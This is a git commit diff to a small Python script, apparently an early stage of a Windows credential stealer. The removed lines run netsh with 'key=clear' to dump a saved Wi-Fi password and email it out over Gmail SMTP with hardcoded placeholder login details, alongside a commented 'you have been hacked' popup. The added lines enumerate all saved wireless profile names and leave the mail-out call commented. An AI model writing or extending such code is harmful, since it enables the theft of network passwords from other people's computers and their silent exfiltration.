55e92bc65101dae2c4d114355cc33a9943e8e33a
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-25 17:55:09 -0400

    Finds all network names and prints to the screen

--- execute_and_report.py
+++ execute_and_report.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -9,8 +9,8 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-#command = "%SystemRoot%\Sysnative\msg.exe * you have been hacked"
-command = "netsh wlan show profile UPC723762 key=clear"
-#subprocess.Popen(command, shell=True)
-result = subprocess.check_output(command, shell=True)
-send_mail("my_email@gmail.com", "abc123", result)
+command = "netsh wlan show profile"
+networks = subprocess.check_output(command, shell=True)
+network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
+print(network_names)
+#send_mail("my_email@gmail.com", "abc123", result)
